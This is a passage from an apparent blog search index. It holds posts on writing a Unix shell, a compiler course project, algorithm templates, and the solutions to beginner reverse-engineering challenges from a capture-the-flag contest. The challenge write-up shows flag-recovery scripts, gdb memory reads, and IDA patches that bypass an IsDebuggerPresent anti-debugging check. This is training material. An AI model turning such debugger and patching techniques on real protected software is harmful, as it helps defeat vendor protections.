PrintBlue(\u0026#34;z-shell: you are now in \u0026#34;); printf(\u0026#34;%s\\n\u0026#34;, args[1]); fflush(stdout); } continue; } if (strcmp(args[args_count - 1], \u0026#34;\u0026amp;\u0026#34;) == 0) { flag = FLAG_EXECVE_NOTWAIT; } pid_t pid = fork(); if (pid == -1) { PrintRed(\u0026#34;z-shell: an error occurred while forking\\n\u0026#34;); fflush(stdout); } else if (pid == 0) { int fl = execvp(args[0], args); if (fl == -1) { PrintRed(\u0026#34;z-shell: unable to execute the programme \u0026#34;); printf(\u0026#34;%s.\\n\u0026#34;, args[0]); fflush(stdout); } exit(0); } else if (flag == FLAG_EXECVE_WAIT) wait(NULL); his.his_count++; his.buf[his.his_count] = (char *)malloc(MAX_ARGS * MAX_ARGS_LEN); strcpy(his.buf[his.his_count], buffer); } return 0; } ","permalink":"http://localhost:1313/posts/oslab2/","summary":"实验题目 Project 1—UNIX Shell and History Feature This project consists of designing a C program to serve as a shell interface that accepts user commands and then executes each command in a separate process. This project can be completed on any Linux, UNIX, or Mac OS X system. A shell interface gives the user a prompt, after which the next command is","title":"实现一个自己的shell（操作系统Lab2）"},{"content":"1. 上机题目简介 上机实验的目的 通过做上机题加深对编译器构造原理和方法的理解，巩固所学知识。\n会用正规式和产生式设计简单语言的语法；\n会用递归下降子程序编写编译器或解释器；\n上机题目 - 简单函数绘图语言的解释器 实现简单函数绘图的语句 循环绘图（FOR-DRAW）\n比例设置（SCALE）\n角度旋转（ROT）\n坐标平移（ORIGIN）\n屏幕（窗口）的坐标系 左上角为原点 x方向从左向右增长 y方向从上到小增长（与一般的坐标系方向相反） 函数绘图源程序举例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 --------------- 函数f(t)=t的图形 origin is (100, 300);\t-- 设置原点的偏移量 rot is 0;\t-- 设置旋转角度(不旋转) scale is (1, 1);\t-- 设置横坐标和纵坐标的比例 for T from 0 to 200 step 1 draw (t, 0); -- 横坐标的轨迹（纵坐标为0） for T from 0 to 150 step 1 draw (0, -t); -- 纵坐标的轨迹（横坐标为0） for T from 0 to 120 step 1 draw (t, -t); -- 函数f(t)=t的轨迹 默认值： origin is (0, 0) rot is 0; scale is (1, 1) 2. 开发环境及配置 环境：GNU-g++ 9.4.0/Python 3.9 tkinter\n文本编辑器：Visual Studio Code\n构建工具：GNU make\n代码仓库地址：https://github.com/zeroy0410/GraphCompiler\n图形库依赖 需要运行环境下存在Python以及tkinter图形库。\n编译： 在代码所在目录，运行命令：\n1 make 使用 1 ./GraphCompiler [ObjectFile] (可选参数\u0026#34;test\u0026#34;测试词法分析器) 3. 基本原理与解决思路 该项目由词法分析器（scanner）、语法分析器（parser）、语义分析器（semantic）组成。\n词法分析器 词法分析是计算机科学中将字符序列转换为记号（token）序列的过程。进行词法分析的程序或者函数叫作词法分析器（lexical analyzer，简称lexer），也叫扫描器（scanner）。词法分析器一般以函数的形式存在，供语法分析器调用。\n本项目的记号如下表所示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 enum Token_Type { ORIGIN /* 0 */, SCALE /* 1 */, ROT /* 2 */, IS /* 3 */, TO /* 4 */, STEP /* 5 */, DRAW /* 6 */, FOR /* 7 */, FROM /* 8 */, //保留字 T /* 9 */,\t//参数 SEMICO /* 10 */, L_BRACKET /* 11 */, R_BRACKET /* 12 */, COMMA /* 13 */, PLUS /* 14 */, MINUS /* 15 */, MUL /* 16 */, DIV /* 17 */, POWER /* 18 */, FUNC /*19 */, CONST_ID /* 20 */, NONTOKEN /* 21 */, ERRTOKEN /* 22 */ }; 存储Token的结构体如下所示：\n1 2 3 4 5 6 7 struct Token { Token_Type type;\t//记号类别 char *lexeme;\t//属性，字符串，指向char类型的指针 double value;\t//属性，常数的值，double型 double (*FuncPtr)(double); //属性，函数指针，代表一个指向返回double值并带有一个double形参的函数的指针的类型 }; 本词法分析器采用一次扫描，程序不断从文件中读入字符，通过分隔符（空格、换行符）等将输入切分成一个一个的单词，再与字典中的记号匹配，进行记号的识别。详细的识别方法见代码，相当于做了单词的切分。\n语法分析器 语法分析器将为句子构建语法树，同时检查程序的语法错误。报告错误的代码笔者将其封装为了一个errorReporter库以供整个项目调用，代码如下所示：\n1 2 3 4 5 6 7 extern void err_exit(const char *msg, const char *err, int err_code) { printf(\u0026#34;Compiler fatal error: \u0026#34;); printf(msg, err); puts(\u0026#34;\\ncompilation terminated.\u0026#34;); exit(err_code); } 语法分析器根据一定的文法接收并匹配词法分析器识别到的记号，文法如下所示：\n1 2 3 4 5 Expression ==\u0026gt; Term{(plus | minus)Term} Term ==\u0026gt; Factor{(mul | div)Factor} Factor ==\u0026gt; Plus Factor | Minus Factor | Component Component==\u0026gt; Atom[Power Component] Atom ==\u0026gt; Const_ID | T | FUNC L_BRACKET Expression R_BRACKET | L_BRACKET Expression R_BRACKET 表达式的语法树如下所示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 struct ExprNode{ Token_Type OpCode; union{ struct{//两个孩子的内部节点: 二元运算如PLUS, MUL等. 一元加, 一元减 ExprNode *Left, *Right; } CaseOperator; struct{//一个孩子的内部节点: 函数调用 ExprNode *Child; FuncPtr MathFuncPtr; }CaseFunc; double CaseConst; double *CaseParmPtr; }Content; }; 构建语法树的整体流程见代码parser.cpp。\n整体算法流程如下：\n语句的固定形式不外乎origin、scale、rot、for这几种，首先识别每条语句的开头Token，在分别匹配每种语句所需的Token，若能匹配则构建相应语法树，若不能则报告错误，代码如下所示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 void parser() { FetchToken(); while (cur_token-\u0026gt;type != NONTOKEN) { switch (cur_token-\u0026gt;type) { case ORIGIN: origin_statement(); break; case SCALE: scale_statement(); break; case ROT: rot_statement(); break; case FOR: for_statement(); break; case T: break; case SEMICO: break; default: err_exit(\u0026#34;\u0026#34;, \u0026#34;\u0026#34;, -EFAULT); break; } MatchToken(SEMICO); } } 语义分析器 笔者选择生成Python中间代码，并使用Python的tkinter图形库进行绘图。\n语义分析器解析语法分析器构建的语法树，并负责中间代码生成。核心为：\n表达式值的计算：深度优先后序遍历语法树 图形的绘制：画出每个坐标点 主要工作为：\n从origin, rot, scale中得到坐标变换所需的信息 DrawLoop语句根据每一个值进行处理, 包括计算点的坐标, 进行坐标变换, 绘制出该点 同时设计DrawPixel、GetCoordinate等函数进行辅助。\n详见semantic.cpp。\n4. 关键类及主要方法 词法分析器 Token_Type：枚举类型，表示记号的分类。\nToken_Tab：字典。\nToken：用来存储记号的数据结构。\nInitScanner()：初始化词法分析器。\nGetToken()：从输入文件中获取一个记号。\nCloseScanner()：关闭词法分析器。\n语法分析器 ExprNode：存储语法树结点的数据结构。\nMakeExprNode：制作一个语法树节点。\natom()：匹配Atom文法。\ncomponent()：匹配Component文法。\nfactor()：匹配Factor文法。\nterm()：匹配Term文法。\nexpression()：匹配Expression文法。\nFetchToken()：从词法分析器中获取一个记号，若是错误记号，报错。\nMatchToken()：匹配记号，若不匹配，报错。\norigin_statement()：处理Origin语句（scale_statement、rot_statement、for_statement）同理。\nparser()：语法分析器暴露给main的接口。\n语义分析器 GetExprVal()：计算表达式树的值。\nDrawLoop()：生成绘制函数的Python代码（此项目中此代码为中间代码）。\nCloseDrawer()：关闭绘图。\nDrawPixel()：绘制一个点。\nGetCoordinate()：计算绘制点的坐标。\n5. 测试截图 6. 总结体会 此次编译原理实验我收获颇丰。只有自己亲自完成整个过程才能对课本上的知识有着深入而直观的了解。在完成实验的过程中，我实践了词法分析、语法分析、语义分析的算法流程，提升了自己的工程能力。\n","permalink":"http://localhost:1313/articles/GraphCompiler/","summary":"1. 上机题目简介 上机实验的目的 通过做上机题加深对编译器构造原理和方法的理解，巩固所学知识。 会用正规式和产生式设计简单语言的语法； 会用递归下降子","title":"编译原理大作业报告"},{"content":" @zeroy.site\n读入输出挂 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 inline int read(){ char c=getchar(); int num=0,fl=1; while(c\u0026lt;48 || c\u0026gt;57){if(c==\u0026#39;-\u0026#39;)fl=-1;c=getchar();} while(c\u0026gt;=48 \u0026amp;\u0026amp; c\u0026lt;=57){num=(num\u0026lt;\u0026lt;1)+(num\u0026lt;\u0026lt;3)+(c^48);c=getchar();} return num*fl; } inline void write(int x){ if(x\u0026lt;0){ putchar(\u0026#39;-\u0026#39;); x=-x; } if(x\u0026gt;9)write(x/10); putchar(x%10+\u0026#39;0\u0026#39;); } 正向表 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int tot=0,h[M]; struct edge{ int nxt; int to,cost; }G[3*M]; void add(int a,int b,int c){ G[++tot]=(edge){h[a],b,c}; h[a]=tot; } //图论题存图用的 //遍历： for(int i=h[x];i;i=G[i].nxt){ int u=G[i].to,v=G[i].cost; //... } 基础数据结构 树状数组 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 void Add(int x,int d){ while(x\u0026lt;=n){ C[x]+=d; x+=(x\u0026amp;-x); } } int Sum(int x){ int res=0; while(x){ res+=C[x]; x-=(x\u0026amp;-x); } return res; } //在线单点加值，查询前缀和，单次操作复杂度均为O(logn) ST表 预处理\n1 2 3 4 5 6 7 8 void Init_RMQ(int n){ for(int i=1;i\u0026lt;=n;i++)f[i][0]=A[i]; lg2[1]=0; for(int i=2;i\u0026lt;=n;i++)lg2[i]=lg2[i\u0026gt;\u0026gt;1]+1; for(int j=1;(1\u0026lt;\u0026lt;j)\u0026lt;=n;j++) for(int i=1;i+(1\u0026lt;\u0026lt;j)-1\u0026lt;=n;i++) f[i][j]=max(f[i][j-1],f[i+(1\u0026lt;\u0026lt;(j-1))][j-1]); } 查询\n1 2 3 4 5 int query(int l,int r){ int k=lg2[r-l+1]; return max(f[l][k],f[r-(1\u0026lt;\u0026lt;k)+1][k]); } //预处理复杂度为O(nlogn),单次查询复杂度为O(1) 线段树 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 struct Segment_tree{ #define fa tree[p] #define lson tree[p\u0026lt;\u0026lt;1] #define rson tree[p\u0026lt;\u0026lt;1|1] struct node{ int l,r; LL add;//懒标记 LL sum; int len(){return r-l+1;} }tree[M\u0026lt;\u0026lt;2]; void up(int p){ fa.sum=lson.sum+rson.sum;\t} void down(int p){ if(fa.add==0)return; lson.add+=fa.add; lson.sum+=fa.add*lson.len(); rson.add+=fa.add; rson.sum+=fa.add*rson.len(); fa.add=0; } void build(int l,int r,int p){ fa.l=l;fa.r=r;fa.sum=fa.add=0; if(l==r){fa.sum=A[l];return;} int mid=(l+r)\u0026gt;\u0026gt;1; build(l,mid,p\u0026lt;\u0026lt;1); build(mid+1,r,p\u0026lt;\u0026lt;1|1); up(p); } void update(int l,int r,LL d,int p){ if(fa.l==l\u0026amp;\u0026amp;fa.r==r){ fa.sum+=1LL*fa.len()*d; fa.add+=d; return; } int mid=(fa.l+fa.r)\u0026gt;\u0026gt;1; down(p); if(r\u0026lt;=mid)update(l,r,d,p\u0026lt;\u0026lt;1); else if(l\u0026gt;mid)update(l,r,d,p\u0026lt;\u0026lt;1|1); else { update(l,mid,d,p\u0026lt;\u0026lt;1); update(mid+1,r,d,p\u0026lt;\u0026lt;1|1);\t} up(p); } LL query(int l,int r,int p){ if(fa.l==l\u0026amp;\u0026amp;fa.r==r)return fa.sum; down(p); int mid=(fa.l+fa.r)\u0026gt;\u0026gt;1; if(r\u0026lt;=mid)return query(l,r,p\u0026lt;\u0026lt;1); else if(l\u0026gt;mid)return query(l,r,p\u0026lt;\u0026lt;1|1); return query(l,mid,p\u0026lt;\u0026lt;1)+query(mid+1,r,p\u0026lt;\u0026lt;1|1); } }T; //区间加减，区间查询和，单次操作复杂度均为O(logn) //可实现的变种：区间乘积，区间染色问题等等。 并查集 1 2 3 4 5 6 7 int getfa(int x){ return fa[x]==x?x:fa[x]=getfa(fa[x]); } //初始状态下所有fa[x]=x void Union(int x,int y){//两个集合合并 fa[getfa(x)]=getfa(y); } 树上算法 LCA 跳重链\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 void dfs(int x,int f,int d){ dep[x]=d; sz[x]=1; fa[x]=f;son[x]=0; for(int i=0;i\u0026lt;G[x].size();i++){ int u=G[x][i]; if(u==f)continue; dfs(u,x,d+1); if(sz[u]\u0026gt;sz[son[x]])son[x]=u; sz[x]+=sz[u]; } } void dfs_top(int x,int tp){ top[x]=tp; if(son[x])dfs_top(son[x],tp); for(int i=0;i\u0026lt;G[x].size();i++){ int u=G[x][i]; if(u==fa[x]||u==son[x])continue; dfs_top(u,u); } } int LCA(int a,int b){ while(top[a]!=top[b]){ if(dep[top[a]]\u0026gt;dep[top[b]])a=fa[top[a]]; else b=fa[top[b]]; } return dep[a]\u0026gt;dep[b]?b:a; } 倍增\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 void dfs(int x,int f,int d){ dep[x]=d; fa[x][0]=f; for(int i=0;i\u0026lt;G[x].size();i++){ int u=G[x][i]; if(u==f)continue; dfs(u,x,d+1); } } int LCA(int a,int b){ if(dep[a]\u0026gt;dep[b])swap(a,b); int step=dep[b]-dep[a]; for(int i=19;i\u0026gt;=0;i--) if(step\u0026amp;1\u0026lt;\u0026lt;i)b=fa[b][i]; if(a==b)return a; for(int i=19;i\u0026gt;=0;i--) if(fa[a][i]!=fa[b][i])a=fa[a][i],b=fa[b][i]; return fa[a][0]; } for(int j=1;j\u0026lt;=19;j++) for(int i=1;i\u0026lt;=n;i++) fa[i][j]=fa[fa[i][j-1]][j-1]; 树链剖分 寻找重儿子\n1 2 3 4 5 6 7 8 9 10 void dfs(int x,int f,int d){ dep[x]=d;fa[x]=f;sz[x]=1;son[x]=0; for(int i=h[x];i;i=G[i].nxt){ int u=G[i].to; if(u==f)continue; dfs(u,x,d+1); if(sz[u]\u0026gt;sz[son[x]])son[x]=u; sz[x]+=sz[u]; } } 处理top\n1 2 3 4 5 6 7 8 9 void dfs_top(int x,int tp){ top[x]=tp;ID[x]=++tt;ln[tt]=x; if(son[x])dfs_top(son[x],tp); for(int i=h[x];i;i=G[i].nxt){ int u=G[i].to; if(u==son[x]||u==fa[x])continue; dfs_top(u,u); } } query\n1 2 3 4 5 6 7 8 9 10 11 12 while(top[u]!=top[v]){ if(dep[top[u]]\u0026gt;dep[top[v]]){ query(ID[top[u]],ID[u],1); u=fa[top[u]]; } else { query(ID[top[v]],ID[v],1); v=fa[top[v]]; } } if(dep[u]\u0026gt;dep[v])query(ID[v],ID[u],1); else query(ID[u],ID[v],1); 数学 莫比乌斯反演 定义 $\\mu$ 为莫比乌斯函数，定义为\n$$ \\mu(n)= \\begin{cases} 1\u0026amp;n=1\\ 0\u0026amp;n\\text{ 含有平方因子}\\ (-1)^k\u0026amp;k\\text{ 为 }n\\text{ 的本质不同质因子个数}\\ \\end{cases} $$\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 void getMu() { mu[1] = 1; for (int i = 2; i \u0026lt;= n; ++i) { if (!flg[i]) p[++tot] = i, mu[i] = -1; for (int j = 1; j \u0026lt;= tot \u0026amp;\u0026amp; i * p[j] \u0026lt;= n; ++j) { flg[i * p[j]] = 1; if (i % p[j] == 0) { mu[i * p[j]] = 0; break; } mu[i * p[j]] = -mu[i]; } } } 莫比乌斯变换 设 $f(n),g(n)$ 为两个数论函数。\n形式一：如果有 $f(n)=\\sum_{d\\mid n}g(d)$，那么有 $g(n)=\\sum_{d\\mid n}\\mu(d)f(\\frac{n}{d})$。\n形式二：如果有 $f(n)=\\sum_{n|d}g(d)$，那么有 $g(n)=\\sum_{n|d}\\mu(\\frac{d}{n})f(d)$。\n扩展欧几里得算法 1 2 3 4 void exgcd(ll a,ll b,ll \u0026amp;d,ll \u0026amp;x,ll \u0026amp;y){ if(!b){d=a;x=1;y=0;return;} exgcd(b,a%b,d,y,x);y-=a/b*x; } 逆元 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 int inv(int a){ ll x,y,d; exgcd(a,m,d,x,y); return (x%MOD+MOD)%MOD; } //当a与mod互质时也可使用费马小定理，qkpow(a,mod-2) int qkpow(int a,int b){ int res=1; while(b){ if(b\u0026amp;1)res=res*a%mod; a=a*a%mod; b\u0026gt;\u0026gt;=1; } return res; } //注意不要爆int或者long long 线性筛逆元 1 2 3 4 5 6 7 void Init(){ fac[0]=1;rev[1]=1; for(int i=1;i\u0026lt;=n;i++) fac[i]=(fac[i-1]*i)%MOD; for(int i=2;i\u0026lt;=n;i++)//线性筛逆元 rev[i]=(MOD-MOD/i)*rev[MOD%i]%MOD; } FFT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 struct Complex{ double x,y; Complex(){} Complex(double _x,double _y):x(_x),y(_y){} Complex operator + (const Complex \u0026amp;res) const{ return (Complex){x+res.x,y+res.y};\t} Complex operator - (const Complex \u0026amp;res) const{ return (Complex){x-res.x,y-res.y};\t} Complex operator * (const Complex \u0026amp;res) const{ return (Complex){x*res.x-y*res.y,x*res.y+y*res.x};\t} }; Complex A[M],B[M]; double pi=acos(-1.0); void FFT(Complex *y,int n,int f){ if(n==1)return; Complex L[n\u0026gt;\u0026gt;1],R[n\u0026gt;\u0026gt;1]; for(int i=0;i\u0026lt;n;i+=2)L[i\u0026gt;\u0026gt;1]=y[i],R[i\u0026gt;\u0026gt;1]=y[i+1]; FFT(L,n\u0026gt;\u0026gt;1,f);FFT(R,n\u0026gt;\u0026gt;1,f); Complex wn(cos(2*pi/n),f*sin(2*pi/n)),w(1,0); for(int i=0;i\u0026lt;(n\u0026gt;\u0026gt;1);i++,w=w*wn){ y[i]=L[i]+w*R[i]; y[i+(n\u0026gt;\u0026gt;1)]=L[i]-w*R[i]; } } double q[M],b[M],C[M]; int main(){ //... int nn=n,mm=n; mm+=nn; for(nn=1;nn\u0026lt;=mm;nn\u0026lt;\u0026lt;=1); FFT(A,nn,1);FFT(B,nn,1); for(int i=0;i\u0026lt;=nn;i++)A[i]=A[i]*B[i]; FFT(A,nn,-1); //... } 字符串算法 KMP 给出两个字符串S1和S2，若S1的区间[l,r]与S2完全相同，则称S2在S1中出现了，其出现位置为l。\n现在请你求出S2在S1中所有出现的位置。\n定义一个字符串S的border为S的一个非S本身的子串t，满足t既是S的前缀，又是S的后缀。\n对于S2，你还需要求出对于每个前缀S\u0026rsquo;的最长border t‘的长度。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #include\u0026lt;bits/stdc++.h\u0026gt; #define M 1000005 using namespace std; char s1[M],s2[M]; int f[M]; void getf(char *s,int l){ f[0]=f[1]=0; for(int i=1;i\u0026lt;l;i++){ int j=f[i]; while(j\u0026amp;\u0026amp;s[i]!=s[j])j=f[j]; if(s[i]==s[j])j++; f[i+1]=j; } } int main(){ scanf(\u0026#34;%s%s\u0026#34;,s1,s2); int l1=strlen(s1); int l2=strlen(s2); getf(s2,l2); for(int i=0,j=0;i\u0026lt;l1;i++){ while(j\u0026amp;\u0026amp;s2[j]!=s1[i])j=f[j]; if(s2[j]==s1[i])j++; if(j==l2) printf(\u0026#34;%d\\n\u0026#34;,i-l2+2); } for(int i=1;i\u0026lt;=l2;i++) printf(\u0026#34;%d \u0026#34;,f[i]); return 0; } 后缀数组 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 int sa[M], rk[M], t1[M], t2[M], tmp[M], cnt1[M], cnt2[M], H[M]; struct node { char x; int id; bool operator\u0026lt;(const node \u0026amp;res) const { if (x != res.x) return x \u0026lt; res.x; return id \u0026lt; res.id; } } A[M]; void Init(char *s, int n) { for (int i = 1; i \u0026lt;= n; i++) A[i] = (node){s[i], i}; sort(A + 1, A + n + 1); for (int i = 1; i \u0026lt;= n; i++) sa[i] = A[i].id; rk[sa[1]] = 1; for (int i = 2; i \u0026lt;= n; i++) { rk[sa[i]] = rk[sa[i - 1]]; if (s[sa[i]] != s[sa[i - 1]]) rk[sa[i]]++; } for (int l = 1; rk[sa[n]] \u0026lt; n; l \u0026lt;\u0026lt;= 1) { for (int i = 0; i \u0026lt;= n; i++) cnt1[i] = cnt2[i] = 0; for (int i = 1; i \u0026lt;= n; i++) cnt1[t1[i] = rk[i]]++, cnt2[t2[i] = (l + i \u0026lt;= n) ? rk[i + l] : 0]++; for (int i = 1; i \u0026lt;= n; i++) cnt1[i] += cnt1[i - 1], cnt2[i] += cnt2[i - 1]; for (int i = n; i \u0026gt;= 1; i--) tmp[cnt2[t2[i]]--] = i; for (int i = n; i \u0026gt;= 1; i--) sa[cnt1[t1[tmp[i]]]--] = tmp[i]; rk[sa[1]] = 1; for (int i = 2; i \u0026lt;= n; i++) { rk[sa[i]] = rk[sa[i - 1]]; if (t1[sa[i]] != t1[sa[i - 1]] || t2[sa[i]] != t2[sa[i - 1]]) rk[sa[i]]++; } } for (int i = 1, j = 0; i \u0026lt;= n; i++) { j -= j \u0026gt; 0; while (s[i + j] == s[sa[rk[i] - 1] + j]) j++; H[rk[i]] = j; } } struct Stable { int mn[M][22], Log[M]; void Init(int n) { for (int i = 1; i \u0026lt;= n; i++) { mn[i][0] = H[i]; if (i \u0026gt; 1) Log[i] = Log[i \u0026gt;\u0026gt; 1] + 1; } for (int j = 1; j \u0026lt; 22; j++) for (int i = 1; i + (1 \u0026lt;\u0026lt; j - 1) \u0026lt;= n; i++) mn[i][j] = min(mn[i][j - 1], mn[i + (1 \u0026lt;\u0026lt; j - 1)][j - 1]); } int Query(int l, int r) { int t = Log[r - l + 1]; return min(mn[l][t], mn[r - (1 \u0026lt;\u0026lt; t) + 1][t]); } } st; int LCP(int l, int r) { l = rk[l], r = rk[r]; if (l \u0026gt; r) swap(l, r); return st.Query(l + 1, r); } ","permalink":"http://localhost:1313/articles/templates/","summary":"@zeroy.site 读入输出挂 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 inline int read(){ char c=getchar(); int num=0,fl=1; while(c\u0026lt;48 || c\u0026gt;57){if(c==\u0026#39;-\u0026#39;)fl=-1;c=getchar();} while(c\u0026gt;=48 \u0026amp;\u0026amp; c\u0026lt;=57){num=(num\u0026lt;\u0026lt;1)+(num\u0026lt;\u0026lt;3)+(c^48);c=getchar();} return num*fl; } inline void write(int x){ if(x\u0026lt;0){ putchar(\u0026#39;-\u0026#39;); x=-x; } if(x\u0026gt;9)write(x/10); putchar(x%10+\u0026#39;0\u0026#39;); } 正向表 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int tot=0,h[M]; struct edge{","title":"Templates"},{"content":"0x00. simple-unpack 使用exeinfope脱壳，拖进IDA shift+F12搜索字符串。\n0x01. logmein 反编译得到如下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 void __fastcall __noreturn main(int a1, char **a2, char **a3) { size_t v3; // rsi int i; // [rsp+3Ch] [rbp-54h] char s[36]; // [rsp+40h] [rbp-50h] BYREF int v6; // [rsp+64h] [rbp-2Ch] __int64 v7; // [rsp+68h] [rbp-28h] char v8[28]; // [rsp+70h] [rbp-20h] BYREF int v9; // [rsp+8Ch] [rbp-4h] v9 = 0; strcpy(v8, \u0026#34;:\\\u0026#34;AL_RT^L*.?+6/46\u0026#34;); v7 = 0x65626D61726168LL; v6 = 7; printf(\u0026#34;Welcome to the RC3 secure password guesser.\\n\u0026#34;); printf(\u0026#34;To continue, you must enter the correct password.\\n\u0026#34;); printf(\u0026#34;Enter your guess: \u0026#34;); __isoc99_scanf(); v3 = strlen(s); if ( v3 \u0026lt; strlen(v8) ) sub_4007C0(); for ( i = 0; i \u0026lt; strlen(s); ++i ) { if ( i \u0026gt;= strlen(v8) ) sub_4007C0(); if ( s[i] != (char)(*((_BYTE *)\u0026amp;v7 + i % v6) ^ v8[i]) ) sub_4007C0(); } sub_4007F0(); } 可以看出，flag就是v7，v6，v8经过一定规则生成的字符串，提取出生成flag的逻辑，写成脚本如下：\n1 2 3 4 5 6 v8=\u0026#34;:\\\u0026#34;AL_RT^L*.?+6/46\u0026#34; v7 = \u0026#39;ebmarah\u0026#39;[::-1] s=\u0026#39;\u0026#39; for i in range(len(v8)): s+=chr(ord(v7[i%7])^ord(v8[i])) print(s) 0x02. insanity 直接拖进IDA，查找字符串。\n0x03. python-trade 反编译之后发现有个encode函数，根据函数的逻辑规则写出decode函数如下：\n1 2 3 4 5 6 7 8 import base64 buf = base64.b64decode(\u0026#39;XlNkVmtUI1MgXWBZXCFeKY+AaXNt\u0026#39;) flag = \u0026#39;\u0026#39; for i in buf: i -= 16 i ^= 32 flag += chr(i) print(flag) 0x04. re1 又一个直接查找字符串就能找到flag的题。\n0x05. game 打开是个游戏，游戏通关拿到flag（草）\n0x06. Hello, CTF 反编译获得如下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 int __cdecl main(int argc, const char **argv, const char **envp) { int i; // ebx char v4; // al int result; // eax char Buffer[2]; // [esp+12h] [ebp-5Eh] BYREF char v7[20]; // [esp+14h] [ebp-5Ch] BYREF char v8[32]; // [esp+28h] [ebp-48h] BYREF __int16 v9; // [esp+48h] [ebp-28h] char v10; // [esp+4Ah] [ebp-26h] char v11[36]; // [esp+4Ch] [ebp-24h] BYREF strcpy(v11, \u0026#34;437261636b4d654a757374466f7246756e\u0026#34;); while ( 1 ) { memset(v8, 0, sizeof(v8)); v9 = 0; v10 = 0; printf(aPleaseInputYou); scanf(\u0026#34;%s\u0026#34;, v7); if ( strlen(v7) \u0026gt; 0x11 ) break; for ( i = 0; i \u0026lt; 17; ++i ) { v4 = v7[i]; if ( !v4 ) break; sprintf(Buffer, \u0026#34;%x\u0026#34;, v4); strcat(v8, Buffer); } if ( !strcmp(v8, v11) ) printf(\u0026#34;success!\\n\u0026#34;); else printf(\u0026#34;wrong!\\n\u0026#34;); } printf(\u0026#34;wrong!\\n\u0026#34;); result = --Stream._cnt; if ( Stream._cnt \u0026lt; 0 ) return _filbuf(\u0026amp;Stream); ++Stream._ptr; return result; } 阅读代码后发现就是将输入的字符串转换为16进制存储，再与给定字符串比较。\n因此可以根据给定字符串推导出flag。\n0x07. open-source 题目直接给出了源代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(int argc, char *argv[]) { if (argc != 4) { printf(\u0026#34;what?\\n\u0026#34;); exit(1); } unsigned int first = atoi(argv[1]); if (first != 0xcafe) { printf(\u0026#34;you are wrong, sorry.\\n\u0026#34;); exit(2); } unsigned int second = atoi(argv[2]); if (second % 5 == 3 || second % 17 != 8) { printf(\u0026#34;ha, you won\u0026#39;t get it!\\n\u0026#34;); exit(3); } if (strcmp(\u0026#34;h4cky0u\u0026#34;, argv[3])) { printf(\u0026#34;so close, dude!\\n\u0026#34;); exit(4); } printf(\u0026#34;Brr wrrr grr\\n\u0026#34;); unsigned int hash = first * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207; printf(\u0026#34;Get your key: \u0026#34;); printf(\u0026#34;%x\\n\u0026#34;, hash); return 0; } 根据规则构造payload即可获取flag。\n0x08. no-strings-attached 打开来发现是一个非常大的程序：\n注意到最后一个函数authenticate可能是验证输入的flag是否正确，打开后如下：\n看样子是要比较ws和s2的值是否一致，而s2是由decrypt函数生成的：\n生成flag的算法看起来挺复杂，懒得写了，故采用动态调试。阅读汇编代码可知，decrypt函数结束后，返回值存在eax中。\n用gdb再decrypt函数处下个断点，程序运行至decrypt处停下，再往前运行一步，再结束运行此函数，此时eax寄存器存储的值就是flag。\n1 2 3 4 (gdb)b decrypt (gdb)n (gdb)finish (gdb)x/6sw $eax 0x09. csaw2013reversing2 打开来发现有一个窗体，弹出了一坨乱码： 打开IDA查看程序逻辑：\n发现程序存在反调试IsDebuggerPresent。\n跳过反调试，将jnz short loc_401096改为jmp short loc_401096，绕过反调试检查。\n再将int 3 ;Trap to Debugger改为nop去掉这个中断。\n再跳转回原来的弹窗输出flag。\nPatch Program的方法：Edit-\u0026gt;Patch Program-\u0026gt;Assemble\n全部更改完成后，点击Edit-\u0026gt;Patch Program-\u0026gt;Apply patches to input file\n0x0a. getit 拖进IDA看见如下代码：\n分析逻辑之后发现t的值就是flag，可以直接根据逻辑写exp，不过我这里使用动态调试的方法。\n在for循环的第一个函数处下个断点，之后直接查看t的值。\n1 2 3 (gdb)b fseek (gdb)r (gdb)x/6 0x6010e0#t的地址 成功获取flag。\n0x0b. maze XCTF reverse maze - YenKoc - 博客园 (cnblogs.com)\n","permalink":"http://localhost:1313/articles/reverse-exercise-area/","summary":"0x00. simple-unpack 使用exeinfope脱壳，拖进IDA shift+F12搜索字符串。 0x01. logmein 反编译得到如下代码： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22","title":"攻防世界reverse练习区WP"},{"content":"前置知识：欧拉定理\n进阶知识：Miller Rabin算法（用于生成大素数），蒙哥马利算法（用于加快大数相乘再取模运算）\n引入 